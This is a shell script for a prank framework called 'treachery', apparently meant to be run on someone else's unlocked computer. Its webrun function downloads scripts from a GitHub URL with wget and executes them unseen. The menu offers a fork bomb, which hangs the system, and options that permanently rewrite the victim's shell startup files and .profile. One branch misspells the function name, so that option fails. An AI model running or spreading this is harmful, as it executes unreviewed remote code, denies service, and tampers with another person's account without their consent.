#!/bin/sh
# dash uses . not source, so this checks if that needs to be remedied
if which source 2>/dev/null >/dev/null
then
	:;
else
	alias source="."
fi
# Function declarations
webrun(){
	sh -c "$(wget -qO - $1)"
	case "${SHELL}" in
		"/bin/zsh")
			source "${HOME}/.zshrc"
			;;
		"/bin/bash")
			source "${HOME}/.bashrc"
			;;
		"/bin/fish")
			source "${HOME}/.config/fish/config.fish"
			;;
		*)
			;;
	esac
}
BASEURL="https://raw.githubusercontent.com/BeerB34r/treachery/refs/heads/master"
# Main program
echo -n 'Hello and welcome to this framework for treachery, built by the Goblin himself, for your execution pleasure. within you will find many "useful" options, available to you through just a few command-line arguments.'"\n\n"

treachery(){
# check if input is in the form of cmdline argument, if not do it interactively
	INPUT="$@"
	if [ ! -n "${INPUT}" ]
	then
		echo -n "Please provide your choice of treachery: "
		read INPUT
		echo ""
	fi
# the heart of the program, does all the heavy lifting
	case "${INPUT}" in
		"list"|"help"|"-h")
			echo "available options are as follows:
		'list'|'help'|'-h' displays this list
		'forked bom' summons a bunch of forks in terminals
		'forkbomb' does an actual forkbomb, do not use lightly
		'gif' gives you the choice between several different ascii gifs to display in terminal
		'parrot' displays a disco parrot in the terminal
		'boykisser' sets the users prompt to Boykisser with the caption 'You like leaving your screen unlocked, dont you' (21 lines tall)
			NB! is permanent, as it changes all* shell startup scripts, as well as .profile
		'prompt' sets the users prompt to a much less intrusive version of the boykisser (1 line tall)
			NB! is permanent, as it changes all* shell startup scripts, as well as .profile
			"
			treachery
			;;
		"forked bom")
			echo -n "Forked bom chosen\n"
			webrun ${BASEURL}/assorted/forked_bom/deploy_fork_bom.sh
			;;
		"forkbomb")
			echo -n "Forkbomb chosen\n"
			webru ${BASEURL}/assorted/forkbomb.sh
			;;
		"gif")
			echo -n "Gif chosen\n"
			webrun ${BASEURL}/assorted/gif.sh
			;;
		"parrot")
			echo -n "Parrot chosen\n"
			webrun ${BASEURL}/assorted/parrot.sh
			;;
		"boykisser")
			echo -n "Boykisser chosen\n"
			webrun ${BASEURL}/assorted/you_like_leaving_your_screen_unlocked_dont_you.sh
			;;
		"prompt")
			echo -n "Prompt chosen\n"
			webrun ${BASEURL}/assorted/prompt.sh
			;;
		*)
			if [ -n "${INPUT}" ]
			then
				echo -n "'${INPUT}' not found\n"
			fi
			echo -n "Treachery canceled\n"
			;;
	esac
}
treachery $@
clear
